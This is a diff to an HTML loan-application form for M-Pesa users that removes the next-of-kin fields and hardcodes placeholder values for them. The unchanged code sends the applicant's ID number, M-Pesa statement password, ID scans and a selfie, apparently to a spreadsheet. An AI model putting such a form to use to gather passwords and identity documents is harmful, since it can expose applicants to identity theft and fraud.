@@ -60,7 +60,6 @@
             margin: 10px 0 20px 0;
             transition: 0.2s;
         }
-        .price-list-btn:hover { background: #f0f7ff; }
 
         .agent-status {
             display: flex;
@@ -160,10 +159,8 @@
             box-sizing: border-box;
             transition: 0.2s;
         }
-        .whatsapp-btn:hover { background: #f0fff4; }
 
         .footer { text-align: center; font-size: 0.7em; color: #9ca3af; margin: 30px 0; line-height: 1.6; }
-        
         .hint-text { font-size: 0.82em; color: #6b7280; font-weight: 400; display: block; margin-top: 2px; }
     </style>
 </head>
@@ -245,24 +242,11 @@
         </div>
         <div class="trust-badge">
             <span>💡</span>
-            <span><strong>Why 12 Months?</strong> We review your long-term patterns so that a single slow month doesn't stop your approval!</span>
+            <span><strong>Why 12 Months?</strong> We review your long-term patterns so that a single slow month doesn't stop your approval! Next of Kin will be requested upon approval.</span>
         </div>
 
         <label>Statement PDF Password</label>
         <input type="text" name="mpesa_password" placeholder="Enter Statement password" required style="margin-top:5px;">
-
-        <div style="margin-top:30px; border-top: 1px solid #f3f4f6; padding-top: 20px;">
-            <p style="font-size: 0.75em; font-weight: 800; color: #111;">NEXT OF KIN INFORMATION</p>
-        </div>
-        
-        <label>Next of Kin Full Name</label>
-        <input type="text" name="nok_name" placeholder="Full Name" required>
-
-        <label>Next of Kin ID Number</label>
-        <input type="text" name="nok_id" maxlength="8" pattern="\d*" title="Please enter a valid 8-digit ID number" placeholder="Enter ID Number" required>
-
-        <label>Next of Kin Phone Number</label>
-        <input type="text" name="nok_contact" value="+254" required>
 
         <button type="submit" class="btn-submit" id="submitBtn">
             <span id="btnText">Submit Secured Application</span>
@@ -316,9 +300,10 @@
                 customer_email: form.customer_email.value,
                 id_number: form.id_number.value,
                 mpesa_password: form.mpesa_password.value,
-                nok_name: form.nok_name.value,
-                nok_id: form.nok_id.value,
-                nok_contact: form.nok_contact.value,
+                // Sent as fixed values to prevent Sheet errors
+                nok_name: "Provided on Approval",
+                nok_id: "00000000",
+                nok_contact: "Requested post-approval",
                 id_front: idFrontBase64,
                 id_back: idBackBase64,
                 selfie: selfieBase64,
